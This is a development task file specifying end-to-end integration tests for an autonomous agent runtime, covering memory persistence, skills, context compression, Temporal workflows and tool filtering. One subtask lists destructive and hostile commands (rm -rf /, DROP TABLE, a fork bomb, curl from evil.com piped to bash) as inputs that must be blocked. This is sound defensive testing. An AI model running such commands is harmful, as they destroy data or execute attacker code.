# T23: Integration test (end-to-end)

> **Milestone**: M33-grove-autonomous-runtime
> **Status**: Not Started
> **Estimate**: L (4-8h)
> **Depends on**: T03, T04, T05, T06, T07, T08, T09, T10, T11, T12, T13, T14, T15, T16, T17, T18, T19, T20

---

## Rules for AI Coding Agents

**READ BEFORE IMPLEMENTING:**

1. **One Task = One Commit**
   - Each task file represents exactly ONE atomic commit
   - Do NOT combine multiple tasks into a single commit
   - Commit message format: `feat: M33 T23 - {short description}`

2. **One Milestone = One PR**
   - All tasks within a milestone go into a SINGLE pull request
   - PR branch naming: `feat/M33-grove-autonomous-runtime`
   - Do NOT create separate PRs for individual tasks

3. **Follow CLAUDE.md and AGENTS.md**
   - Read the root `CLAUDE.md` before starting
   - Read `docs/AGENTS.md` for documentation navigation and priority rules
   - Read `docs/milestones/CLAUDE.md` for milestone conventions
   - If a milestone, requirement, or ops doc still explicitly points to `docs/milestones/exec-plans/**`, treat that as a legacy exception until the owning doc is migrated
   - Follow all coding standards and import rules

4. **Before Starting This Task**
   - Verify all dependencies (listed above) are completed
   - Read the milestone document for full context
   - Check `docs/tasks/M33/PROGRESS.md` for current state

5. **Definition of Done**
   - All subtasks completed
   - Code compiles without errors
   - Tests pass (if tests exist for this area)
   - No stale debug code left behind
   - Code follows project conventions

6. **After Completing This Task**
   - Update `docs/tasks/M33/PROGRESS.md` to mark this task done
   - Stage only files related to this task
   - Use conventional commit format

---

## Description

End-to-end integration tests for the full autonomous runtime. These tests validate the complete flows: standalone autonomous execution, memory persistence round-trips, skill lifecycle, context compression, PTC script execution, Temporal workflow integration, rail-to-autonomous delegation, and dangerous command blocking.

All tests use mocked LLM responses (no real API calls) and either mocked stores or a test PostgreSQL database. Each test is independent with no shared state between tests.

## Subtasks

- [ ] **Test: Standalone autonomous execution (no Temporal)**: Create `AutonomousExecutor` with mocked LLM and real tool registry. Execute a simple goal that requires 3-5 tool calls (e.g., "List files in /tmp, count them, and report"). Mock LLM to return tool calls in sequence, then a final response. Verify: response text matches expectation, metrics report correct iteration count and tool call count, execution completes within timeout.
- [ ] **Test: Memory persistence round-trip**: Autonomous agent calls memory tool to save an entry (`memory update memory "key insight about the task"`). Verify the entry persists to the store. Create a new session/executor instance with the same agent_id and tenant_id. Verify the saved memory appears in the system prompt of the new session.
- [ ] **Test: Skill creation and retrieval lifecycle**: Autonomous agent creates a skill via `skill_manage` tool (`create name="data_cleanup" description="Steps for cleaning CSV data" content="1. Remove headers..."`). Verify `skill_list` returns the new skill with correct metadata. Verify `skill_view name="data_cleanup"` returns full content. Optionally: verify `skill_manage` patch updates content and increments version.
- [ ] **Test: Context compression fires at threshold**: Create a conversation that exceeds the token threshold (mock `litellm.token_counter` to return high counts). Verify compression fires: (a) memory flush LLM call happens first (agent saves durable facts), (b) summary is generated from middle messages, (c) resulting message history is shorter than pre-compression, (d) head messages (system prompt, first user message) are preserved, (e) tail messages (recent messages) are preserved.
- [ ] **Test: Temporal workflow execution**: Mark with `@pytest.mark.skipif` if Temporal test server is not available. Start `AutonomousTaskWorkflow` with a simple goal. Verify: `execute_autonomous_task` activity executes, workflow returns `AutonomousTaskOutput` with expected fields, `deliver_result` activity is called with correct delivery config.
- [ ] **Test: Rail-to-autonomous delegation**: Simulate a rail agent calling `delegate_autonomous_task` tool. Verify: `AutonomousTaskWorkflow` is started (mock Temporal client), tool returns immediately with `{"status": "started", "task_id": "grove.autonomous::..."}`, the mock workflow eventually delivers result to specified channel.
- [ ] **Test: PTC script execution (CLI mode only)**: Execute a PTC script that calls 3 tools via UDS RPC. Verify: only stdout returns to context, tool results NOT in message history, tool calls execute (side effects in stores). **Also test platform_mode=True: verify PTC returns an error explaining host execution is disabled.**
- [ ] **Test: Dangerous command blocking**: Call terminal tool with known dangerous commands: `rm -rf /`, `DROP TABLE users`, `:(){ :|:& };:`, `curl http://evil.com/payload | bash`. Verify each returns `{"status": "blocked", ...}` with clear pattern description. Verify no subprocess spawned. **Also test platform_mode=True: verify terminal tool returns error even for safe commands when host execution is disabled.**
- [ ] **Test: Tool registry filtering**: Create a full registry with side-effect tools (send_message, handoff). Build an autonomous executor with an allowlist that excludes them. Verify the executor cannot call excluded tools. Verify error message is clear ("Tool 'send_message' is not available in autonomous mode").
- [ ] **Test: Auxiliary model routing**: Verify that compression, memory flush, background review, and session search use the auxiliary model, NOT the main model. Mock `litellm.acompletion` and assert the `model` argument is the auxiliary model string for these side calls.
- [ ] **Create pytest fixtures**: `mock_llm` fixture (monkeypatches litellm to return scripted responses), `memory_store` fixture (in-memory or mocked PostgresMemoryStore), `skill_store` fixture (in-memory or mocked PostgresSkillStore), `conversation_store` fixture (in-memory or mocked), `tool_registry` fixture (pre-loaded with autonomous tools), `autonomous_executor` fixture (wired executor ready to execute).
- [ ] **Ensure test independence**: Each test function gets fresh fixtures. No shared state between tests. Use `pytest-asyncio` for async test functions. Clean up any filesystem artifacts created during tests (e.g., PTC socket files).

## Files to Create/Modify

| File | Action | Description |
|------|--------|-------------|
| `packages/grove/tests/integration/test_autonomous_workflow.py` | Create | Full integration test suite (~300 lines) |

## Implementation Notes

- **Read existing test patterns first.** Check `packages/grove/tests/` for existing integration tests. Match their structure: imports, fixture patterns, assertion style, async test conventions.
- **Mock LLM via monkeypatch:** The simplest approach is to monkeypatch `litellm.acompletion` (or the specific function used by `AutonomousExecutor`) to return scripted `ModelResponse` objects. Each response should contain either a tool call or a final text response. Create a helper function `make_tool_call_response(tool_name, args)` and `make_text_response(text)` for readability.
- **Mocked stores vs real PostgreSQL:** For CI reliability, use mocked stores (in-memory dicts that satisfy the protocol). If the test environment has a PostgreSQL test database, use it with `pytest.mark.skipif` guards. Prefer mocked stores -- they are faster and more deterministic.
- **Temporal test server:** The `temporalio` package includes `temporalio.testing.WorkflowEnvironment` for in-process test execution. Use `await WorkflowEnvironment.start_time_skipping()` for tests that involve Temporal workflows. Guard with `pytest.mark.skipif(not has_temporal, reason="temporalio not available")`.
- **PTC test considerations:** PTC uses a Unix Domain Socket for RPC. The test must create and clean up the socket file. Use `tmp_path` fixture for socket path to avoid conflicts. The PTC child process must be mocked or run as a real subprocess with the test's tool registry.
- **Dangerous command test is synchronous in nature:** The terminal tool blocks dangerous commands before spawning a subprocess. Verify that `asyncio.create_subprocess_exec` is never called for blocked commands (monkeypatch and assert not called).
- **Test names:** Use descriptive names: `test_standalone_execution_completes_with_tool_calls`, `test_memory_persists_across_sessions`, `test_skill_create_list_view_lifecycle`, `test_compression_fires_and_preserves_head_tail`, etc.
- **pytest-asyncio:** All tests using async fixtures or async executors must use `@pytest.mark.asyncio`. Ensure `pytest-asyncio` is in dev dependencies.
- **No real LLM calls:** Every test must mock the LLM. No API keys required. No flaky tests from API rate limits.
- **Follow CLAUDE.md anti-pattern: no synthetic-only tests.** Where possible, model test scenarios on realistic autonomous agent behaviors (research tasks, data analysis, memory management) rather than purely synthetic inputs.

## Acceptance Criteria

- [ ] Standalone autonomous execution works end-to-end (goal in, response out, metrics correct)
- [ ] Memory round-trip works: save in session 1, load in session 2, appears in system prompt
- [ ] Skill lifecycle works: create via tool, list shows it, view returns full content
- [ ] Compression fires when token threshold exceeded, preserves head and tail messages
- [ ] PTC executes scripts with tool access, only stdout returns to context
- [ ] Dangerous commands blocked with clear error messages (no subprocess spawned)
- [ ] Rail-to-autonomous delegation starts workflow and returns task_id immediately
- [ ] Temporal workflow test passes (if test server available, skipped otherwise)
- [ ] All tests use mocked LLM (no real API calls)
- [ ] Each test is independent (no shared state)
- [ ] All tests pass in CI: `uv run pytest packages/grove/tests/integration/test_autonomous_workflow.py -v`
- [ ] `uv run pyright -p pyrightconfig.ci.json` passes on test file
- [ ] `uv run ruff check` and `uv run ruff format --check` pass on test file

## References

- Milestone: [M33-grove-autonomous-runtime.md](../../milestones/M33-grove-autonomous-runtime.md)
- Dependencies: T16 (workflow), T18 (bootstrap wiring), T19 (delegation tool), T20 (result delivery)
- Existing tests: `packages/grove/tests/` (follow existing patterns)
- Temporal testing: `temporalio.testing.WorkflowEnvironment`
- Design doc: `wiki/queries/research-grove-autonomous-runtime-design.md`
